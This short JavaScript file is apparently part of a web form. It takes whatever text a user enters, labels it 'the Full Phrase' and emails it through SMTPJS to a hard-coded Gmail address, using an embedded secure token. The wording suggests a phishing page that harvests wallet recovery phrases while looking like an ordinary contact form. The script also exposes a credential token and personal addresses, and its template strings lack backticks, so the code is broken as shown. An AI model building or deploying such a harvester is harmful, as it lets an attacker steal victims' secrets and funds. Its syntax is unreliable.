const Form = document.getElementById('my-form');
const Names = document.getElementById('contact-inputs');
const Status = document.getElementById('status'); // Ensure there's a status element to show results

function sendEmail() {
    const bodyMessage = This is the Full Phrase: ${Names.value};

   
    if (!Names.value.trim()) {
        alert("Please enter a valid name or subject.");
        return;
    }

    
    Email.send({
        SecureToken: "61088E92CC6CE8969A516D4C8FB689DA33B70A06CD2121613B937C80BF503611F88F8A52BA1D18289E5799D91F9BCF52",
        To: "samsonnwanna26@gmail.com", 
        From: "mikebrew001@gmail.com", 
        Subject: Names.value,
        Body: bodyMessage
    }).then((message) => {
        if (message === "OK") {
            Status.style.display = "block";
            Status.innerText = "Email sent successfully!";
        } else {
            Status.style.display = "block";
            Status.innerText = Error: ${message};
        }
    }).catch((error) => {
        console.error("Email send error:", error);
        Status.style.display = "block";
        Status.innerText = "An error occurred while sending the email.";
    });
}

Form.addEventListener("submit", (e) => {
    e.preventDefault();
    sendEmail();
});
